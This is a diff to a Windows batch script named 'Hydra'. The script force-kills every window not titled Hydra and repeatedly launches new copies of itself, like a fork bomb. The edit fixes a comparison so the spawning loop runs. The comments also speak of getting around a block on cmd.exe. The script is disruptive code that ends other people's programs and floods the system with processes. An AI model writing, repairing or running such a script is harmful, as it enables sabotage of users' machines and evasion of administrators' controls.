@@ -1,6 +1,6 @@
 @ECHO OFF
 ::Can't test either, they found a way to disable cmd.exe, SO BATCH IS DEAD!
-::Yes, the comparison on line 20, you can't do that!
+::We can find a way. 
 ::Wrote this on my phone so I cannot test, so can you check for any errors? 
 TITLE Hydra 
 set n=0
@@ -17,7 +17,7 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/
 SET windowcount=%%F
 )
 TASKKILL /F /FI "WINDOWTITLE ne Hydra"
-IF "%windowcount%"<"%n%" (
+IF "%windowcount%"=="%n%" (
 START Hydra.bat
 START Hydra.bat
 set /a n+=1
